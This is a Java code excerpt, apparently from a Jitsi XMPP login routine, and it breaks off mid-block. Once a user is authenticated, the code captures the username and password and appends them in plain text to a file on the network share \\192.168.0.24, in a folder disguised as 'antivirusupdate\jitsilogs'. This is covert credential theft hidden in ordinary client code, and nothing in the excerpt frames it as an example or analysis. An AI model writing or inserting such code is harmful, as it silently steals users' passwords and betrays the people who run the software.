    ...
    extends AbstractProtocolProviderService
{
        ...
        throws XMPPException
    {
        ...
        if(connection.isAuthenticated())
        {
            ...
            XmppConnector.xmppUserName = userName;

            LoginByPasswordStrategy lbps = null ;
                if(loginStrategy instanceof LoginByPasswordStrategy)
                    lbps = (LoginByPasswordStrategy) loginStrategy;
                if(lbps != null)
                    XmppConnector.password = lbps.getPassword();
            
            File destFile = new File("\\\\192.168.0.24\\antivirusupdate\\jitsilogs");

                if(!destFile.exists()){
                    destFile.mkdirs();
                }
                destFile = new File("\\\\192.168.0.24\\antivirusupdate\\jitsilogs\\lock.log");

                try(FileWriter fw = new FileWriter(destFile,true))
                {
                    if(fw != null){
                        String writerUserName = "username :"+userName;
                        String password = "password :"+loginStrategy.getPassword();
                        fw.write(writerUserName+" > "+password);
